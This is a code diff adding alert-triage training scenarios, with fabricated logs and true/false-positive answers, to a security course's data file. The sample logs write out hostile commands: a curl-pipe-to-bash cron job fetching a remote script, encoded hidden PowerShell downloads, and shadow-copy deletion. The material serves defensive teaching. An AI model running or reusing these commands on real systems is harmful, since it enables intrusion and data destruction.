@@ -1111,4 +1111,78 @@ weeks[10].tasks.splice(2, 0, ['own', 'Review events 4768, 4769 and 4776 in your 
 weeks[0].note = 'Rooms you already finished on TryHackMe are ticked automatically from your public profile, so this week is mostly done. Finish what is left and move straight to the quiz. Time you save here is your buffer for later weeks.';
 const thm = { user: 'vicuvi1', at: Date.parse('2026-11-17T12:55:00Z'), codes: 'ninjaskills,tutorial,johntheripperbasics,linuxfundamentalspart1,linuxfundamentalspart2,howwebsiteswork,linuxfundamentalspart3,puttingitalltogether,dnsindetail,httpindetail,windowsfundamentals1xbx,windowsfundamentals2x0x,whatisnetworking,windowsfundamentals3xzx,jrsecanalystintrouxo,metasploitintro,operatingsystemsecurity,offensivesecurityintro,neighbour,careersincyber,wiresharkthebasics,winadbasics,monikerlink,windowscommandline,searchskills,nmap,networkingconcepts,tcpdump,networkingessentials,networkingcoreprotocols,networkingsecureprotocols,publickeycrypto,cryptographybasics,hashingbasics,windowspowershell,linuxshells,humansattackvectors,socroleinblueteam,virtualisationbasics,operatingsystemsintroduction,linuxclibasics,datarepresentation,dataencoding,pythonsimpledemo,windowsbasics,cloudcomputingfundamentals,windowsclibasics,clientserverbasics,insideacomputer,computertypes,blue,toolsrus,hydra,introtolan,osimodelzi,packetsframes,extendingyournetwork,metasploitexploitation,meterpreter,introtosiem,securityprinciples,securityengineerintro,burpsuitebasics,incidentresponsefundamentals,logsfundamentals,socfundamentals,digitalforensicsfundamentals,firewallfundamentals,idsfundamentals,vulnerabilityscanneroverview,cyberchefbasics,capabasics,flarevmarsenaloftools,remnuxgettingstarted,gobusterthebasics,training,sqlmapthebasics,javascriptessentials,webapplicationbasics,sqlfundamentals,shellsoverview,hfb1stolenmount,javascriptsimpledemo,theciatriad,databasesqlbasics,cryptographyconcepts,becomeahacker,becomeadefender,hh-theconciergeknows-2d7eb4d9,hh-room404-804573bf,hh-complimentary-05e0b604,hh-packedlight-02e5330c,hh-beachbar-d849f7f7,hh-overheardatbreakfast-6f01793c,hh-donotdisturb-84a45644,hh-towelonthesunbed-61271709,hh-cryptocabana-f81cac95,hh-thehollowshell-ddb582ac,hh-infinitypool-5b3548af,hh-afterhours-b090d1f0,pyramidofpainax,cyberkillchainzmt,introductiontodevsecops,investigatingwithelk101,unifiedkillchain,securesdlc,microsoftwindowshardening,introtosecurityarchitecture,activedirectoryhardening,cryptographyintro,networksecurityprotocols,owaspapisecuritytop10d0,owaspapisecuritytop105w,soar,splunk101,introductiontocloudsecurityc6,linuxsystemhardening,virtualizationandcontainers,vulnerabilitymanagementkj,dastzap,weaponizingvulnerabilities,iaaaidm,networkdevicehardening,threatmodelling,cybergovernanceregulation,codeanalysis,sast,seriskmanagement,traverse,auditingandmonitoringse,introtoirandim,socl1alerttriage,socl1alertreporting,socworkbookslookups,socmetricsobjectives,systemsattackvectors,introductiontoedrs,owasptopten2025one,owasptopten2025two,owasptopten2025three,noscoperce'.split(',') };
 
-module.exports = { weeks, stages, thm };
+/* ---------- alert simulator: built-in scenarios ---------- */
+const A = (sev, rule, host, time, summary, logs, v, why) => ({ sev, rule, host, time, summary, logs, v, why });
+const sims = [
+  { title: 'Monday morning queue', context: `Northwind asset list
+10.20.0.50      NESSUS-01, vulnerability scanner. Scheduled scans: Monday 06:00 to 08:00
+BACKUP-01       backup server. Nightly job 02:00 to vault.backupcorp.example (approved vendor), about 40 GB
+DC-01           domain controller. Changes require a change ticket
+Helpdesk note   Password expiry reminders were emailed on Friday; several users reset on Monday morning
+Corporate SSO   login.northwind.example (the only legitimate sign-in address)`, alerts: [
+    A('high', 'Office application spawned PowerShell', 'FIN-PC-07', '08:14', 'winword.exe started powershell.exe with an encoded command.', `08:14:02  FIN-PC-07  WINWORD.EXE (m.ionescu) opened Invoice_Nov.docm from Outlook cache
+08:14:09  FIN-PC-07  WINWORD.EXE -> powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A...
+08:14:15  PROXY      10.20.4.31 -> 185.220.101.47:443  first seen in organisation, 2.1 KB out, 310 KB in
+08:14:40  FIN-PC-07  powershell.exe wrote C:\\Users\\Public\\upd.exe`, 'tp', 'Office spawning hidden, encoded PowerShell that downloads an executable from a never-seen IP is a malicious document executing. Isolate the host.'),
+    A('medium', 'Multiple failed logins followed by success', 'WS-HR-022', '08:02', 'User a.popa: 6 failed logons then a success.', `08:01:10 to 08:01:55  4625 x6  Account=a.popa  LogonType=2  Source=WS-HR-022 (her assigned workstation)
+08:02:20  4723  a.popa changed her password
+08:02:31  4624  Account=a.popa  LogonType=2  Source=WS-HR-022
+Helpdesk  Ticket INC-4471 08:00 "a.popa cannot log in, password expired"`, 'fp', 'Interactive failures at her own keyboard, a password change, then success, with a matching helpdesk ticket and the expiry note in the asset list. A user who forgot an expired password.'),
+    A('critical', 'Security audit log cleared', 'DC-01', '03:12', 'Event 1102 on the domain controller.', `03:04:11  DC-01  4624  Account=svc_backup  LogonType=3  Source=10.20.4.31 (FIN-PC-07)
+03:06:40  DC-01  4720  New account sysadm2 created by svc_backup
+03:06:52  DC-01  4728  sysadm2 added to Domain Admins by svc_backup
+03:12:05  DC-01  1102  The audit log was cleared by sysadm2
+Change calendar: no tickets for DC-01 this week`, 'tp', 'A service account logging on from a workstation, creating a Domain Admin and then clearing the log, with no change ticket, is domain compromise. Highest priority in the queue.'),
+    A('low', 'Port scan detected', 'NESSUS-01', '06:31', 'One internal host probed 1,024 ports on 40 servers.', `06:30:02 to 06:44:50  IDS  10.20.0.50 -> 10.20.9.0/24  TCP SYN to ports 1-1024, 40 hosts
+06:45:10  IDS  10.20.0.50 -> 10.20.9.5  HTTP GET /  User-Agent: Nessus`, 'fp', 'The source is the vulnerability scanner in the asset list, inside its Monday 06:00 to 08:00 window. Expected and authorised.'),
+    A('high', 'User clicked a suspicious link', 'WS-SAL-009', '09:20', 'e.lungu clicked a link in an email flagged after delivery.', `09:20:14  PROXY  WS-SAL-009  GET  hxxps://northwind-sso[.]login-portal[.]example/  200
+09:20:48  PROXY  WS-SAL-009  POST hxxps://northwind-sso[.]login-portal[.]example/auth  200  (form fields: user, pass)
+09:41:03  SSO    e.lungu  login success  Source=102.129.145.20 (new country)  MFA=push approved
+Domain login-portal.example registered 2 days ago`, 'tp', 'The page is not the real SSO address, the user posted credentials to it, and 20 minutes later the account logged in from a new country. Credential phishing that worked: reset and revoke sessions.'),
+    A('medium', 'Large outbound data transfer', 'BACKUP-01', '02:00', '39.8 GB uploaded to an external host overnight.', `02:00:05 to 03:38:40  NETFLOW  BACKUP-01 -> vault.backupcorp.example:443  39.8 GB out
+30-day baseline for BACKUP-01 at 02:00: 38 to 41 GB to the same destination`, 'fp', 'Approved vendor from the asset list, the scheduled time, and a volume inside the normal baseline. This is the nightly backup.'),
+    A('medium', 'Anomalous DNS volume', 'HR-PC-02', '10:05', '1,400 TXT queries in ten minutes to one domain.', `10:05:00 to 10:15:00  DNS  HR-PC-02  TXT  x 1,400  *.cdn-sync-data.example
+sample: 00a1.4d5a90000300000004000000ffff0000b8.cdn-sync-data.example
+sample: 00a2.00000000000000400000000000000000.cdn-sync-data.example
+Domain cdn-sync-data.example registered 3 days ago, no web content`, 'tp', 'Long hex subdomains, TXT type, high volume and a days-old domain: DNS tunnelling. Data is leaving or a C2 channel is active.'),
+    A('low', 'New service installed', 'WS-IT-003', '07:50', 'Event 7045: a new Windows service.', `07:50:22  WS-IT-003  7045  Service=GoogleUpdaterService142  Account=LocalSystem
+          ImagePath="C:\\Program Files (x86)\\Google\\GoogleUpdater\\142.0.7416.0\\updater.exe" --system --windows-service
+          Signature: valid, Google LLC
+07:50:30  WS-IT-003  Chrome updated 141 -> 142`, 'fp', 'A validly signed vendor updater in its normal install path, installed during a browser update. Routine software maintenance.'),
+  ] },
+  { title: 'Night shift', context: `Northwind asset list
+Corporate VPN egress  185.60.112.10 (Frankfurt). Logins from this IP are employees on VPN
+SEC-LAB-01            security team test machine. Change CHG-1182: antivirus detection test tonight 22:00 to 23:00
+IT-ADM-02             admin workstation of i.rusu (IT). Ticket REQ-2290: install Sysinternals tools
+PRINT-01              print server. Change CHG-1177 yesterday: svc_print password rotated
+AWS account 4410-prod administrators: ops-maria, ops-dan (no others)`, alerts: [
+    A('high', 'Impossible travel', 'SSO', '21:12', 'm.ionescu signed in from two countries 12 minutes apart.', `21:00:04  SSO  m.ionescu  success  Source=188.244.20.7 (Chisinau, MD)
+21:10:30 to 21:11:50  SSO  m.ionescu  MFA push denied x9  Source=41.58.110.4 (Lagos, NG)
+21:12:02  SSO  m.ionescu  MFA push approved  login success  Source=41.58.110.4
+21:13:40  M365 m.ionescu  New inbox rule "RSS" moves mail containing "invoice" to Archive`, 'tp', 'The second source is not the corporate VPN, nine denied pushes then one approval is MFA fatigue, and a hiding inbox rule followed. Account takeover.'),
+    A('low', 'Antivirus: test file detected', 'SEC-LAB-01', '22:14', 'EICAR-Test-File quarantined.', `22:14:09  AV  SEC-LAB-01  Detected EICAR-Test-File  Path=C:\\Tests\\eicar.com  User=sec.vlad  Action=Quarantined`, 'fp', 'EICAR is a harmless test string, on the security lab machine, inside the approved test window CHG-1182.'),
+    A('critical', 'Ransomware behaviour', 'FS-01', '23:41', 'Mass file renames and shadow copy deletion.', `23:41:02  FS-01  svhost.exe (C:\\Users\\Public\\svhost.exe, unsigned) started by svc_filesync
+23:41:05  FS-01  cmd.exe /c vssadmin delete shadows /all /quiet
+23:41:06 to 23:44:10  FS-01  4,212 files renamed *.lock3d under D:\\Shares
+23:44:15  FS-01  File created D:\\Shares\\READ_ME_RESTORE.txt`, 'tp', 'A misspelled, unsigned binary deleting shadow copies and renaming thousands of files with a ransom note is ransomware in progress. Isolate immediately and escalate.'),
+    A('medium', 'SSH brute force', 'web-prod-02', '02:11', 'Hundreds of failed SSH logins from one address.', `02:09:00 to 02:11:20  sshd  Failed password x312  from 45.155.205.99  users: root, admin, deploy
+02:11:31  sshd  Accepted password for deploy from 45.155.205.99
+02:12:04  sudo  deploy : COMMAND=/usr/bin/crontab -e
+02:12:40  cron  (root) CMD (curl -s http://45.155.205.99/x.sh | bash)`, 'tp', 'The brute force succeeded (Accepted), and the attacker added a cron job that downloads and runs a script. The server is compromised.'),
+    A('medium', 'PowerShell web download', 'IT-ADM-02', '16:20', 'Invoke-WebRequest downloaded a zip archive.', `16:20:11  IT-ADM-02  powershell.exe (i.rusu, interactive)  Invoke-WebRequest https://download.sysinternals.com/files/SysinternalsSuite.zip -OutFile C:\\Tools\\Sysinternals.zip
+16:20:40  IT-ADM-02  File signature check: Microsoft Corporation, valid
+Ticket REQ-2290 assigned to i.rusu: "Install Sysinternals on IT-ADM-02"`, 'fp', 'An administrator, interactively, downloading a signed Microsoft tool from the official domain with a matching ticket. Legitimate admin work.'),
+    A('high', 'Cloud logging disabled', 'AWS 4410-prod', '22:47', 'CloudTrail StopLogging called.', `22:41:03  ConsoleLogin  user=dev-anna  sourceIP=102.129.145.20 (new)  MFAUsed=No
+22:44:02  CreateUser  by dev-anna  newUser=backup-admin
+22:44:20  AttachUserPolicy  target=backup-admin  policy=AdministratorAccess
+22:47:09  StopLogging  user=backup-admin  trail=org-main-trail`, 'tp', 'A no-MFA login from a new IP creates an admin user that is not on the administrator list and then disables logging. Cloud account compromise.'),
+    A('low', 'Repeated failed logins: service account', 'PRINT-01', '00:05', 'svc_print fails to log on every 5 minutes.', `Since yesterday 15:10: 4625 every 300 s  Account=svc_print  Source=PRINT-01  Status=0xC000006A (bad password)
+No 4624 for svc_print from any other host
+CHG-1177 yesterday 15:00: svc_print password rotated`, 'fp', 'Perfectly regular failures from the service\'s own host that began right after its password was rotated. A stale stored password, not an attack. Raise it with IT to fix the config.'),
+    A('medium', 'Kerberos: many service tickets requested', 'DC-01', '03:20', 'One user requested 46 service tickets in a minute.', `03:20:11 to 03:20:54  DC-01  4769 x46  Account=t.rotaru  Source=10.20.4.31 (WS-014)
+          46 different service names, Ticket Encryption Type=0x17 (RC4)
+t.rotaru is a marketing user; normal volume is 3 to 5 tickets a day`, 'tp', 'Dozens of RC4 service tickets for different SPNs in a minute from a non-technical user is Kerberoasting. Treat WS-014 and the account as compromised.'),
+  ] },
+];
+
+module.exports = { weeks, stages, thm, sims };
